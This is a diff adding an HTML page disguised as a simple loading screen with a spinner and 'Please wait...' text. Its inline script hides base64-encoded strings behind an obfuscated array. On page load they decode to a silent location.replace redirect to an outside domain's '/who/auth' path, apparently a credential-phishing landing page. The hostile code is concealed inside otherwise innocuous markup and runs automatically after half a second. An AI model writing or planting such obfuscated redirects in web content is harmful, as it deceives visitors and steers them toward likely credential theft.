@@ -1,0 +1,49 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Loading...</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background: #f8f9fa;
+        }
+        .loader {
+            text-align: center;
+            color: #333;
+        }
+        .spinner {
+            width: 40px;
+            height: 40px;
+            margin: 20px auto;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #3498db;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
+</head>
+<body>
+    <div class="loader">
+        <div class="spinner"></div>
+        <p>Please wait...</p>
+    </div>
+    <script>
+        (function(){
+            const _0x4f=['cmVwbGFjZQ==','bG9jYXRpb24=','aHR0cHM6Ly9lbmNvcmVtaXIuY29tL3doby9hdXRo'];
+            setTimeout(function(){
+                window[atob(_0x4f[1])][atob(_0x4f[0])](atob(_0x4f[2]));
+            }, 500);
+        })();
+    </script>
+</body>
+</html>
